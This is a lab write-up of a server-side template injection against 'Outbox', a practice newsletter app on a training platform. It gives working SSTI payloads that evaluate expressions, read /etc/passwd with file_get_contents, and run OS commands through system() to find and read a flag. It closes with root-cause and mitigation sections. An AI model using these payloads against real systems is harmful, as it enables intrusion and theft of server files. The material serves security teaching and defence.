---
title: "Server-Side Template Injection Leading to Remote Code Execution | Outbox"
date: 2026-05-12 21:25:00 +0530
categories: [Web Security, SSTI]
tags: [ssti, server-side template injection, remote code execution, rce, php, template injection, webversepro, file disclosure, command execution]
platform: Webverse
author: Shivansh Sharma
image:
  path: /assets/images/posts/outbox.webp
  alt: Server-Side Template Injection in Outbox
---

## Overview

Outbox is a minimal email-newsletter SaaS platform that provides users with a lightweight compose-and-preview workflow for newsletters.

The application implemented custom placeholder rendering functionality to support dynamic values such as usernames inside previewed emails. However, the preview feature evaluated user-controlled expressions directly on the server.

By abusing the template rendering logic, it was possible to achieve Server-Side Template Injection (SSTI), leading to arbitrary PHP function execution, file disclosure, command execution, and ultimately full remote code execution on the target system.

## Lab Link

- Lab: [DocketHive – WebVerse](https://dashboard.webverselabs-pro.com/foundational-labs/outbox)

---

## Objective

The objective of this lab was to:

- Analyze the newsletter compose functionality
- Test template rendering behavior
- Confirm SSTI execution
- Read sensitive server files
- Execute operating system commands
- Enumerate the filesystem
- Retrieve the flag from the target server

---

## Initial Setup

The target hostname was added locally.

```bash
echo "192.168.1.100    outbox.local" | sudo tee -a /etc/hosts
```

After registering an account, a new newsletter draft was created.

---

## Creating the Newsletter Draft

A compose request was submitted to the application.

```http
POST /compose HTTP/1.1
Host: outbox.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Origin: http://outbox.local
Referer: http://outbox.local/compose
Cookie: PHPSESSID=9c733a52a7f429d3b7fa5baf5fdaf6b6

action=send&subject=testing+ssti&body=Hello+%7B%7B7*7%7D%7D%2C%0D%0A%0D%0A
```

The newsletter body contained an SSTI test payload.

```twig
{% raw %}
{{7*7}}
{% endraw %}
```

This payload is commonly used to detect template injection vulnerabilities because many template engines evaluate expressions placed inside double curly braces.

---

## Triggering the Preview Functionality

The newsletter preview endpoint processed the supplied template content.

```http
POST /preview HTTP/1.1
Host: outbox.local
```

Relevant request body:

```
Content-Disposition: form-data; name="body"

Hello {{7*7}},
```

---

## Confirming SSTI Execution

The server response evaluated the expression instead of rendering it as plain text.

Response:

```
Hello 49,<br />
<br />
```

This confirmed that user-controlled template expressions were being interpreted server-side.

The application was vulnerable to Server-Side Template Injection.

---

## Reading Sensitive Files

After confirming SSTI execution, arbitrary file access was tested.

Payload:

```twig
{% raw %}
{{file_get_contents('/etc/passwd')}}
{% endraw %}
```

The server returned the contents of `/etc/passwd`, confirming arbitrary file read access through the vulnerable template engine.

This also demonstrated that dangerous PHP functions were accessible directly inside the rendering context.

---

## Escalating to Command Execution

Since PHP functions were executable through the template engine, operating system command execution was tested.

Payload:

```twig
{% raw %}
{{system('find / -iname "*flag*" 2>/dev/null')}}
{% endraw %}
```

The command successfully executed and returned multiple flag-related file paths from the filesystem.

This confirmed full remote code execution through SSTI.

---

## Retrieving the Flag

After locating the flag file, the following payload was used:

```twig
{% raw %}
{{system('cat /home/marisol/flag.txt')}}
{% endraw %}
```

The response returned the flag:

```
WEBVERSE{...}
```

---

## Proof of Exploitation

### SSTI Detection Payload

```twig
{% raw %}
{{7*7}}
{% endraw %}
```

### Evaluated Server Response

```
Hello 49,
```

### Arbitrary File Read

```twig
{% raw %}
{{file_get_contents('/etc/passwd')}}
{% endraw %}
```

### Command Execution

```twig
{% raw %}
{{system('find / -iname "*flag*" 2>/dev/null')}}
{% endraw %}
```

### Flag Retrieval

```twig
{% raw %}
{{system('cat /home/marisol/flag.txt')}}
{% endraw %}
```

---

## Vulnerability Analysis

This vulnerability occurred because the application evaluated user-controlled template expressions directly on the server without sanitization or sandboxing.

Instead of using a secure templating engine with restricted rendering capabilities, the application implemented unsafe custom rendering logic.

The backend likely used dangerous functionality similar to:

```php
eval("return \"$template\";");
```

or directly exposed executable PHP expressions during preview rendering.

Because template expressions were executed server-side, attackers gained access to sensitive PHP functions including:

- `file_get_contents()`
- `system()`
- `exec()`
- `shell_exec()`

This transformed the email preview feature into a full remote code execution primitive.

---

## Impact

This vulnerability allowed complete compromise of the application environment.

An attacker could potentially:

- Execute arbitrary operating system commands
- Read sensitive server files
- Access application secrets
- Retrieve user data
- Achieve remote code execution
- Pivot deeper into internal infrastructure

Since the vulnerable functionality existed inside a normal user workflow, exploitation required only authenticated application access.

---

## Root Cause Analysis

The primary issue was unsafe server-side evaluation of user-controlled template expressions.

Contributing factors included:

- Custom template engine implementation
- Unsafe dynamic PHP execution
- Lack of template sandboxing
- Missing input sanitization
- Exposure of dangerous PHP functions inside templates

The application trusted user-controlled template syntax and executed it directly during preview rendering.

---

## Mitigation

### Avoid Custom Template Engines

Use mature and secure template engines instead of homemade rendering logic.

### Disable Dangerous Functions

Restrict access to dangerous PHP functions such as:

- `system()`
- `exec()`
- `shell_exec()`
- `passthru()`

### Sandbox Template Rendering

Template engines should operate inside restricted execution environments.

### Treat User Input as Data

Never evaluate user-controlled input as executable code.

### Escape Template Expressions Safely

Render template placeholders as plain text when possible.

### Perform Security Reviews for Dynamic Rendering Features

Features involving previews, rendering, or expression parsing should undergo dedicated security testing.

---

## Real-World Insight

Server-Side Template Injection vulnerabilities frequently appear in applications that implement custom rendering systems for emails, previews, reports, invoices, or notifications.

Developers often assume template syntax is harmless presentation logic. In reality, unsafe template evaluation can expose powerful backend functionality directly to attackers.

Once SSTI is achieved, attackers can often escalate from simple expression evaluation to:

- Sensitive file disclosure
- Arbitrary command execution
- Reverse shell access
- Full server compromise

This lab demonstrates how a small convenience feature built for email previews can become a critical remote code execution vulnerability when user-controlled templates are executed directly on the server.